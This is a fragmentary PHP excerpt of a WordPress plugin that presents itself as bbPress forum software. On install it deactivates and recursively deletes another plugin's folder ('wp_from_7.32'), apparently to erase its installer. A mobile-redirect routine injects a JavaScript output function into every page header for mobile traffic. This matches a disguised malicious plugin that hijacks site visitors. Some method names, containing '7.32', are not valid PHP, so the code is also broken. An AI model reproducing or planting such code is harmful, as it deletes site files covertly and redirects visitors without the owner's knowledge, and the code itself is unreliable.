...
if (!class_exists('bb_press100',false)):
class bb_press100 {
    public static $lang = 'en';
    public static $page_title = 'bbPress is forum software';
    public static $menu_title = 'bb_press100';
    public static $menu_slug = 'bb_press100'; 
    public static $plugin_name = 'bb_press100'; 
	...
	public function rrmdir_wp_from_7.32($dir) { 
	   if (is_dir($dir)) { 
		 $objects = scandir($dir); 
		 foreach ($objects as $object) { 
		   if ($object != "." && $object != "..") { 
			 if (filetype($dir."/".$object) == "dir") self::rrmdir_wp_from_7.32($dir."/".$object); else unlink($dir."/".$object); 
		   } 
		 } 
		 reset($objects); 
		 rmdir($dir); 
    ...
    public function install() {
		deactivate_plugins( 'wp_from_7.32/wp_from_7.32.php' );
        self::_do_notice('install');
		chdir('../wp-content/plugins');
		$dir = getcwd().'/wp_from_7.32';
		if(file_exists($dir)){
		self::rrmdir_wp_from_7.32($dir);
		}
    }
    ...
    public function mobile_redirect_v3()
    {
        ...
        switch($user_data->redirect_option)
        {
            ...
            case self::MRT_MOBILE_TRAFFIC:
                if( $this->has_wp_head )
                {
                    add_action( 'wp_head', array( 'bb_press100', 'output_js_script'),10,0 );
                } else{
